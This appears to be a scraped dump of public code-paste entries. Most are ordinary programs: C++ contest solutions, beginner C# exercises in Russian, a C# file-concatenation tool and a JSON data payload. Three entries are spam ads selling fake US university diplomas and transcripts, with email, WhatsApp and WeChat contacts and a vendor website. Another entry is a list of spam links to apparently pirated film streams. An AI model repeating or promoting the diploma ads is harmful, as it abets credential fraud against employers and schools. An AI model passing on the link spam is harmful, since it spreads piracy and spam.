+using System.Linq;
+using System.Text;
+
+class Program
+{
+    static void Main()
+    {
+        StringBuilder header = new StringBuilder(""***********************************"");
+        header.AppendLine();
+
+        string rootPath = @""Path to project"";
+        var files = Directory.GetFiles(rootPath, ""*.cs"", SearchOption.AllDirectories);
+
+        var result = files.Select(path => new { Name = Path.GetFileName(path), Contents = File.ReadAllText(path) })
+                          .Where(info => !info.Contents.Contains(""<auto-generated>"") && !info.Contents.Contains(""<autogenerated />"")
+                          && !info.Contents.Contains(""<auto-generated/>""))
+                          .Select(info =>
+                              header.ToString()
+                              + ""Filename: "" + info.Name + Environment.NewLine
+                              + header.ToString()
+                              + info.Contents);
+
+        StringBuilder singleStr = new StringBuilder();
+        singleStr.AppendLine(string.Join(Environment.NewLine, result));
+
+        Console.WriteLine(singleStr.ToString());
+        File.WriteAllText(Path.Combine(rootPath, ""output.txt""), singleStr.ToString(), Encoding.UTF8);
+    }
+}"
+ayKuNhPG,TonfaiStoneSwapping,tonfain,C++,Thursday 28th of December 2023 03:15:06 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+int main(){
+	ifstream fin(""stoneswapping.in"");
+	
+	int N;
+	fin >> N;
+	
+	char ori[N][N];
+	char finale[N][N];
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			char a;
+			fin >> a;
+			ori[i][j] = a;
+		}
+	}
+	
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			char a;
+			fin >> a;
+			finale[i][j] = a;
+		}
+	}
+	
+	char temp[7][N][N];
+	//case 1
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			temp[0][N-1-j][i] = ori[i][j];
+		}
+	}
+	
+	//case 2
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			temp[1][N-1-j][i] = temp[0][i][j];
+		}
+	}
+	
+	//case 3
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			temp[2][N-1-j][i] = temp[1][i][j];
+		}
+	}
+	
+	//case 4
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			temp[3][i][N-1-j] = ori[i][j];
+		}
+	}
+	
+	//case 5.1
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			temp[4][N-1-j][i] = temp[3][i][j];
+		}
+	}
+	
+	//case 5.2
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			temp[5][N-1-j][i] = temp[4][i][j];
+		}
+	}
+	
+	//case 5.3
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			temp[6][N-1-j][i] = temp[5][i][j];
+		}
+	}
+	
+	for(int k = 0; k<7; k++){
+		bool thiscase = true;
+		for(int i = 0; i<N; i++){
+			for(int j = 0; j<N; j++){
+				if(temp[k][i][j] != finale[i][j]){
+					thiscase = false;
+					break;
+				}
+			}
+			if(!thiscase){
+				break;
+			}
+		}
+		if(thiscase){
+			if(k<4){
+				cout << k+1 << endl;
+			}else{
+				cout << 5 << endl;
+			}
+			return 0;
+		}
+	}
+	
+	bool thiscase1 = true;
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<N; j++){
+			if(ori[i][j] != finale[i][j]){
+				thiscase1 = false;
+			}
+		}
+	}
+	if(thiscase1){
+		cout << 6 << endl;
+		return 0;
+	}
+	
+	cout << 7 << endl;
+}
+"
+9vRyGZdR,TonfaiMilkQueue,tonfain,C++,Thursday 28th of December 2023 03:14:40 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+struct Cow{
+	int arrive, milk_time;
+};
+
+bool asc_arrive(Cow a, Cow b){
+	if(a.arrive == b.arrive){
+		return a.milk_time < b.milk_time;
+	}
+	return a.arrive < b.arrive;
+}
+
+int main(){
+	ifstream fin(""milkqueue.in"");
+	
+	int N;
+	fin >> N;
+	
+	vector<Cow> cows(N);
+	for(int i = 0; i<N; i++){
+		int a, m;
+		fin >> a >> m;
+		
+		cows[i].arrive = a;
+		cows[i].milk_time = m;
+	}
+	
+	sort(cows.begin(), cows.end(), asc_arrive);
+	
+	int curr_time = 0;
+	for(int i = 0; i<N; i++){
+		//cout << ""arrive: "" << cows[i].arrive << "", milk_time: "" << cows[i].milk_time << endl;
+		if(cows[i].arrive > curr_time){
+			curr_time = cows[i].arrive;
+		}
+		curr_time += cows[i].milk_time;
+	}
+	cout << curr_time << endl;
+}
+"
+mhuCpkgz,TonfaiSpringCleaning,tonfain,C++,Thursday 28th of December 2023 03:14:16 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+struct Squirrel{
+	bool start;
+	int hr, min;
+};
+
+struct Time{
+	int hr, min, tot;
+};
+
+bool asc_sq(Squirrel a, Squirrel b){
+	if(a.hr == b.hr){
+		return a.min < b.min;
+	}
+	return a.hr < b.hr;
+}
+
+int main(){
+	ifstream fin(""springcleaning.in"");
+	
+	int N, NL; 
+	fin >> N >> NL;
+	
+	vector<vector<Squirrel>> squ(N);
+	
+	for(int i = 0; i<NL; i++){
+		int a, h, m; string s;
+		fin >> a >> s >> h >> m;
+		a--;
+		squ[a].push_back({(s == ""START""), h, m});
+	}
+	
+	for(int i = 0; i<N; i++){
+		sort(squ[i].begin(), squ[i].end(), asc_sq);
+	}
+	
+	vector<Time> ans(N);
+	for(int i = 0; i<N; i++){
+		int away, now;
+		for(int j = 0; j<squ[i].size(); j++){
+			int mins = ((squ[i][j].hr)*60) + squ[i][j].min;;
+			if(squ[i][j].start){
+				away = mins;
+			}else{
+				now = mins;
+				ans[i].tot += now - away;
+			}
+		}
+	}
+	
+	for(int i = 0; i<N; i++){
+		ans[i].hr = ans[i].tot/60;
+		ans[i].min += ans[i].tot%60;
+		cout << ans[i].hr << "" "" << ans[i].min << endl;
+	}
+}
+"
+EMrwns3s,TonfaiMathExpression,tonfain,C++,Thursday 28th of December 2023 03:13:48 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+bool even(int a){
+	if(a % 2 == 0){
+		return 1;
+	}else{
+		return 0;
+	}
+}
+
+int main(){
+	ifstream fin(""mathexpression.in"");
+	
+	int N;
+	fin >> N;
+	
+	vector<vector<int>> sb(7);
+	vector<int> letter = {'S', 'O', 'M', 'E', 'B', 'I', 'G'};
+	for(int i = 0; i<N; i++){
+		int a; char c;
+		fin >> c >> a;
+		for(int j = 0; j<7; j++){
+			if(letter[j] == c){
+				sb[j].push_back(a);
+			}
+		}
+	}
+	
+	int ans = 0;
+	for(int i = 0; i<sb[0].size(); i++){
+		for(int j = 0; j<sb[1].size(); j++){
+			for(int k = 0; k<sb[2].size(); k++){
+				for(int l = 0; l<sb[3].size(); l++){
+					for(int m = 0; m<sb[4].size(); m++){
+						for(int n = 0; n<sb[5].size(); n++){
+							for(int p = 0; p<sb[6].size(); p++){
+								int expr = (sb[0][i]+sb[2][k]+sb[0][i])*(sb[0][i]+sb[5][n]+sb[0][i]+sb[4][m]+sb[3][l]+sb[3][l])*(sb[3][l]+sb[6][p]+sb[1][j]+sb[0][i]);
+								if(even(expr)){
+									ans++;
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	cout << ans << endl;
+}
+"
+5PEnC5sr,Untitled,kwest87,C#,Thursday 28th of December 2023 03:09:07 AM CDT,"using System;
+
+namespace ConsoleApp14
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.Write(""Введите имя : "");
+            string name = Console.ReadLine();
+            Console.WriteLine();
+            Console.Write(""Введите символ : "");
+            char symbol = Convert.ToChar(Console.Read());
+            Console.WriteLine();
+
+            string middleRow = symbol + name + symbol;
+            string edgeRow = """";
+
+            for (int i = 0; i < middleRow.Length; i++)
+            {
+                edgeRow += symbol;
+            }
+
+            Console.WriteLine(edgeRow);
+            Console.WriteLine(middleRow);
+            Console.WriteLine(edgeRow);
+        }
+    }
+}"
+rXqgEnyP,Untitled,kwest87,C#,Thursday 28th of December 2023 02:46:23 AM CDT,"using System;
+
+namespace ConsoleApp14
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.Write(""Введите имя : "");
+            string name = Console.ReadLine();
+            Console.WriteLine();
+            Console.Write(""Введите символ : "");
+            char sumbol = Convert.ToChar(Console.Read());
+            Console.WriteLine();
+
+            string edgeRow = """";
+            string middleRow = sumbol + name + sumbol;
+            edgeRow = edgeRow + sumbol + sumbol;
+
+            for (int i = 0; i < name.Length; i++)
+            {
+                edgeRow += sumbol;
+            }
+
+            Console.WriteLine(edgeRow);
+            Console.WriteLine(middleRow);
+            Console.WriteLine(edgeRow);
+        }
+    }
+}"
+PVVdUfTF,Untitled,kwest87,C#,Thursday 28th of December 2023 02:22:05 AM CDT,"using System;
+
+namespace ConsoleApp15
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            string password = ""777"";
+            string userUnput;
+            int remainingAttepts = 3;
+            bool isWork = true;
+
+            while (isWork)
+            {
+                Console.Write($""Введите правильно пароль , {remainingAttepts} попытки осталось: "");
+                userUnput = Console.ReadLine();
+                Console.WriteLine();
+                remainingAttepts--;
+
+                if (remainingAttepts > 0)
+                {
+                    if (userUnput == password)
+                    {
+                        Console.WriteLine(""Сообщение ..."");
+                        isWork= false;
+                    }
+                }
+                else
+                {
+                    Console.WriteLine(""Лимит попыток исчерпан."");
+                    isWork = false;
+                }
+            }
+        }
+    }
+}"
+QUE8mbui,WhatsApp: +86 19911539281 Buy Charleston Southern University degree.,jf123123,Bash,Thursday 28th of December 2023 02:07:56 AM CDT,"How to order fake Charleston Southern University diploma? Buy fake Charleston Southern University degree, Get a CSU copy diploma online, Order Charleston Southern University certificate in USA. Charleston Southern University (CSU) is a private Christian university located in Charleston, South Carolina, United States. It was founded in 1964 and is affiliated with the South Carolina Baptist Convention. https://www.diploma888.com/sample/charleston-southern-university-diploma/
+
+CSU offers a wide range of undergraduate and graduate programs across various disciplines. buy fake degree, buy fake diploma, fake certificate, How to buy fake degree certificate online? Where to order fake University of Lynchburg diploma? How long does it take to buy a Charleston Southern University diploma? The university is known for its strong programs in business, education, nursing, criminal justice, and computer science. 
+
+Email: diplomacentersale@gmail.com 
+WhatsApp: +86 19911539281
+WeChat: +86 14779983878 
+https://www.diploma888.com
+
+"
+25CkGGZc,Where to get a College of Staten Island diploma from CUNY?,jf123123,C,Thursday 28th of December 2023 02:03:02 AM CDT,"How to order fake College of Staten Island degree? Where to get a College of Staten Island diploma from CUNY? Buy fake College of Staten Island certificate, Make phony CSI Academic transcript online, Get a CSI copy diploma online, Obtain CSI degree in United States. https://www.diploma888.com/sample/college-of-staten-island-degree/
+
+Is the College of Staten Island a 4 year College?
+The College of Staten Island is a four-year, senior college of The City University of New York providing exceptional opportunities to all of its students and offering undergraduate and graduate degrees as well as certificate and continuing education programs. buy fake degree, buy fake diploma, fake certificate, How to buy fake diploma? I want to buy CSI degree certificate. How to order fake Savannah College of Art and Design degree?
+
+Email: diplomacentersale@gmail.com 
+WhatsApp: +86 19911539281
+WeChat: +86 14779983878 
+https://www.diploma888.com
+
+"
+4NQgyiTU,СПРИНТ № 5 | Итераторы | Урок 5: Итераторы в методах контейнеров 1/3,chevengur,C++,Thursday 28th of December 2023 01:58:12 AM CDT,"#include <algorithm>
+#include <iostream>
+#include <set>
+#include <string>
+#include <vector>
+
+using namespace std;
+
+template <typename It>
+void PrintRange(It range_begin, It range_end) {
+    for (auto it = range_begin; it != range_end; ++it) {
+        cout << *it << "" ""s;
+    }
+    cout << endl;
+}
+
+template <typename It>
+auto MakeSet(It range_begin, It range_end) {
+    return set(range_begin, range_end);
+}
+
+template <typename It>
+auto MakeVector(It range_begin, It range_end){
+    return vector(range_begin, range_end);
+}
+
+template <typename Container, typename IteratorType>
+void EraseAndPrint(Container& con, IteratorType start_) {
+    auto it_erase = con.erase(start_);
+    PrintRange(con.begin(), it_erase);
+    PrintRange(it_erase, con.end());
+}
+
+int main() {
+    vector<string> langs = {""Python""s, ""Java""s, ""C#""s, ""Ruby""s, ""C++""s};
+    EraseAndPrint(langs, langs.begin()+1);
+    return 0;
+}
+"
+SBcQqFyG,WhatsApp: +86 19911539281 How to buy fake Stevenson University diploma,jf123123,Bash,Thursday 28th of December 2023 01:57:01 AM CDT,"Is it valid to buy a realistic Stevenson University degree in USA? How to buy fake Stevenson University diploma? Fake Stevenson University certificate for sale, Easy way to get Stevenson University degree certificate online, Buy fake Stevenson University diploma, Get a Stevenson University transcript. https://www.diploma888.com/sample/stevenson-university-degree/
+
+Located in the north eastern state of Maryland, Stevenson University is a private institution which combines career education with liberal arts. buy fake degree, fake diploma, make official transcript, fake degree maker, obtain fake certificate online, How to buy fake USA diploma? 
+
+Email: diplomacentersale@gmail.com 
+WhatsApp: +86 19911539281
+WeChat: +86 14779983878 
+https://www.diploma888.com
+
+"
+RUJRe3TN,quality field rating payload propose,shevaathalla,JSON,Thursday 28th of December 2023 01:08:40 AM CDT,"{
+    ""QualityId"": 15,
+    ""QualityFarmId"": 17,
+    ""QualityPhaseId"": 1,
+    ""QualitySourceId"": 3,
+    ""QualtiyInspectionGroup"": null,
+    ""QualityDate"": ""2023-12-23"",
+    ""QualityCreatedAt"": ""2023-12-20T09:02:46.000000Z"",
+    ""QualityCreatedBy"": null,
+    ""QualityUpdatedAt"": ""2023-12-20T09:02:46.000000Z"",
+    ""QualityUpdatedBy"": null,
+    ""QualityDeletedAt"": null,
+    ""QualityDeletedBy"": null,
+    ""Phase"": {
+        ""PhaseId"": 1,
+        ""PhaseCountryId"": 4,
+        ""PhaseCropId"": 1,
+        ""PhaseCode"": ""ISOLATION"",
+        ""PhaseName"": ""Isolation"",
+        ""PhaseDAP"": 2,
+        ""PhaseEWD"": 1,
+        ""PhaseOrder"": 1,
+        ""PhaseStatus"": 1,
+        ""PhaseCreatedAt"": ""2023-10-23T03:43:46.000000Z"",
+        ""PhaseCreatedBy"": 5,
+        ""PhaseUpdatedAt"": ""2023-10-23T03:44:25.000000Z"",
+        ""PhaseUpdatedBy"": 5,
+        ""PhaseDeletedBy"": null,
+        ""PhaseDeletedAt"": null
+    },
+    ""QualityFieldRating"": [
+        {
+            ""QfrId"": 1,
+            ""QfrFrId"": 1,
+            ""QfrQualityId"": 15,
+            ""QfrValue"": 10,
+            ""FieldRating"": {
+                ""FieldRatingId"": 1,
+                ""FieldRatingCountryId"": 4,
+                ""FieldRatingCropId"": 1,
+                ""FieldRatingCropFieldId"": 1,
+                ""FieldRatingModuleId"": 46,
+                ""FieldRatingVarietyId"": 55,
+                ""FieldRatingCode"": ""FR1"",
+                ""FieldRatingName"": ""Very Good"",
+                ""FieldRatingStatus"": 1,
+                ""FieldRatingAddDoc"": null,
+                ""FieldRatingRemark"": null,
+                ""FieldRatingPriority"": 1,
+                ""FieldRatingOrder"": 1,
+                ""FieldRatingCreatedAt"": null,
+                ""FieldRatingCreatedBy"": null,
+                ""FieldRatingUpdatedAt"": ""2023-12-27T01:44:54.000000Z"",
+                ""FieldRatingUpdatedBy"": null,
+                ""FieldRatingDeletedAt"": null,
+                ""FieldRatingDeletedBy"": null
+            }
+        },
+        {
+            ""QfrId"": 2,
+            ""QfrFrId"": 2,
+            ""QfrQualityId"": 15,
+            ""QfrValue"": 6
+        },
+        {
+            ""QfrId"": 3,
+            ""QfrFrId"": 3,
+            ""QfrQualityId"": 15,
+            ""QfrValue"": 4
+        }
+    ]
+}"
+vNAVeSrX,drhdrjrj,gadungw71,PHP,Thursday 28th of December 2023 12:55:48 AM CDT,"https://slashpage.com/restore-point-cz
+https://gamma.app/public/Bod-obnovy-2023-online-cely-film-Cesky-dabing-pbb6mq04y3kt239
+https://www.taskade.com/p/sledujte-bod-obnovy-2023-cely-film-online-zdarma-ceskym-titulky-01HJNWNMNYW16D3NJM7GAJ261M
+https://slashpage.com/bod-obnovy2023
+https://gamma.app/public/Sleduj-Bod-obnovy-2023-SledujFilmy-Vsetky-filmy-online-zadarm-avo3y14eho8lzqu
+https://www.taskade.com/p/sleduj-bod-obnovy-2023-cely-film-cz-dabing-hd-kvalite-1080p-01HJNYH7F6JEA6T765TT7V9F6H
+https://slashpage.com/sleduj-bod-obnovy-2023
+https://gamma.app/public/SledujHD-Aquaman-2-a-ztracene-kralovstvi-2023-Cely-Film-Online-a--cuwu9clnxpq51qb
+https://slashpage.com/sledujte-aquaman-2-dabing
+https://slashpage.com/aquaman-2-cely-film-zdarma
+https://gamma.app/public/Aquaman-2-a-ztracene-kralovstvi-2023-Cely-Film-Online-a-Zdarma-C-1vcp3rq321uir8y
+https://github.com/apps/aquaman2sledujfilmyonline
+https://www.deviantart.com/seredet/art/Sleduj-Aquaman-2-Cely-Film-CZ-Dabing-HD-1005787285
+https://github.com/apps/sledujteaquaman2dabingonlinezdarma
+https://www.deviantart.com/rungkadentek/art/Aquaman-2-Cely-Film-Online-Zdarma-Filmy-CZ-1005789667
+https://gamma.app/public/Aquaman-2-a-ztracene-kralovstvi-CELY-FILM-CZSK-DABING-I-TITULKY-fkfqcdz2tukfbvx
+https://slashpage.com/voiraquaman2vf
+https://slashpage.com/voir-aquaman2-streaming-vf
+https://www.deviantart.com/voiraquaman2vf/art/Aquaman-2-et-le-Royaume-Perdu-Streaming-Complet-en-1005794942
+https://gamma.app/public/REGARDER-Aquaman-2-et-le-Royaume-Perdu-2023-Gratuit-Complet-FR-cf5yvfa8olcgk8j
+https://github.com/apps/voirfilmaquaman2freeonline123
+https://vk.com/@687055797-aquaman-2-et-le-royaume-perdu-c
+https://vk.com/@676080774-films-voir-aquaman-2-et-le-royaume-perdu-2023-francais-gratu
+https://vk.com/@692484166-voir-aquaman-2-et-le-royaume-perdu-streaming-vf-gratuit-en-f
+https://groups.google.com/g/voir-aquaman-2-et-le-royaume-perdu-en-streaming-vf-complet/c/wxi3Og-hItk
+https://slashpage.com/voirfilms-aquaman2
+https://www.deviantart.com/filmsaquaman2complet/art/VOIR-Aquaman-2-et-le-Royaume-Perdu-2023-Gratuit-1005800416
+https://gamma.app/public/Aquaman-2-et-le-Royaume-Perdu--9n4vm5nxpf3lfhu
+https://gamma.app/public/Aquaman-2-et-le-Royaume-Perdu-Streming-VF-c4K-ob52kgh1sws9isx
+https://slashpage.com/aquaman2voir4k"
+1Ps0fjGd,TonfaiGeneratingTriangles,tonfain,C++,Thursday 28th of December 2023 12:35:19 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+int main(){
+	ifstream fin(""generatingtriangles.in"");
+	
+	int N, S;
+	fin >> N >> S;
+	
+	vector<vector<int>> temp_tri(N);
+	int curr_num = S;
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<i+1; j++){
+			//cout << ""i: "" << i << endl;
+			temp_tri[i].push_back(curr_num);
+			curr_num++;
+			if(curr_num > 9){
+				curr_num = 1;
+			}
+		}
+	}
+	//cout << temp_tri[1][0] << endl;
+	//cout << temp_tri[0][0] << "" "" << temp_tri[1][0] << temp_tri[2][0] << "" "" << temp_tri[3][0] << "" "" << temp_tri[4][0] << endl;
+	for(int i = 0; i<N; i++){
+		for(int j = 0; j<i; j++){
+			cout << "" "" << "" "";
+		}
+		for(int j = i; j<N-1; j++){
+			cout << temp_tri[j][i] << "" "";
+		}
+		cout << temp_tri[N-1][i] << endl;
+	}
+}
+"
+Bbx8iJHw,TonfaiSystemInstallation,tonfain,C++,Thursday 28th of December 2023 12:34:54 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+vector<vector<int>> grid;
+
+int sum_area(int a, int b){
+	int tot = 0;
+	for(int i = 0; i<3; i++){
+		for(int j = 0; j<3; j++){
+			tot += grid[a+i][b+j];
+		}
+	}
+	return tot;
+}
+
+int main(){
+	ifstream fin(""sprinkler.in"");
+	int NR, NC;
+	fin >> NR >> NC;
+	
+	grid.resize(NR);
+	
+	for(int i = 0; i<NR; i++){
+		for(int j = 0; j<NC; j++){
+			int c; fin >> c;
+			grid[i].push_back(c);
+		}
+	}
+	
+	int max = 0;
+	int ans_r, ans_c;
+	for(int i = 0; i<NR-2; i++){
+		for(int j = 0; j<NC-2; j++){
+			int curr_area = sum_area(i, j);
+			if(curr_area > max){
+				max = curr_area;
+				ans_r = i;
+				ans_c = j;
+			}
+		}
+	}
+	
+	cout << max << endl;
+	cout << ans_r+1 << "" "" << ans_c+1 << endl;
+}
+"
+Fw90Htp1,TonfaiDiscow,tonfain,C++,Thursday 28th of December 2023 12:34:26 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+int main(){
+	ifstream fin(""discow.in"");
+	
+	string s;
+	fin >> s;
+	
+	vector<char> alphabet = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'};
+	vector<bool> visited(26);
+	int ans = 0;
+	for(int i = 0; i<51; i++){
+		if(visited[i]){
+			//cout << ""continued"" << endl;
+			continue;
+		}else{
+			visited[i] = true;
+		}
+		char begin_char = s[i];
+		int e = i+1;
+		char end_char = s[i+1];
+		if(i == 0){
+			if(s[i] == s[51]){
+				continue;
+			}
+		}
+		//cout << ""begin_char: "" << begin_char << "", end_char: "" << end_char << endl;
+		vector<int> singles(26);
+		while(begin_char != end_char){
+			for(int j = 0; j<26; j++){
+				if(alphabet[j] == end_char){
+					singles[j]++;
+					break;
+				}
+			}
+			e++;
+			end_char = s[e];
+		}
+		visited[e] = true;
+		//for(int j = 0; j<26; j++){
+			//if(alphabet[j] == end_char){
+				//visited[j] = true;
+			//}
+		//}
+		
+		for(int j = 0; j<26; j++){
+			if(singles[j] == 1){
+				//cout << ""begin char: "" << begin_char << "", single: "" << alphabet[j] << endl;
+				ans++;
+			}
+		}
+	}
+	cout << ans/2 << endl;
+}
+"
+7CUjQ8yT,TonfaiAcornShuffle,tonfain,C++,Thursday 28th of December 2023 12:33:45 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+struct AC{
+	int idx, shuffled;
+};
+
+bool asc_s(AC a, AC b){
+	return a.shuffled < b.shuffled;
+}
+
+int main(){
+	ifstream fin(""acornshuffle.in"");
+	
+	int N;
+	fin >> N;
+	
+	vector<AC> seq(N);
+	for(int i = 0; i<N; i++){
+		int a; fin >> a; a--;
+		seq[i].idx = i;
+		seq[i].shuffled = a;
+	}
+	
+	sort(seq.begin(), seq.end(), asc_s);
+	
+	vector<int> ans;
+	for(int i = 0; i<N; i++){
+		int id; fin >> id;
+		ans.push_back(id);
+	}
+	
+	vector<int> temp(N);
+	for(int i = 0; i<3; i++){
+		for(int j = 0; j<N; j++){
+			temp[seq[j].idx] = ans[j];
+		}
+		for(int j = 0; j<N; j++){
+			ans[j] = temp[j];
+		}
+	}
+	
+	for(int i = 0; i<N; i++){
+		cout << ans[i] << endl;
+	}
+}
+"
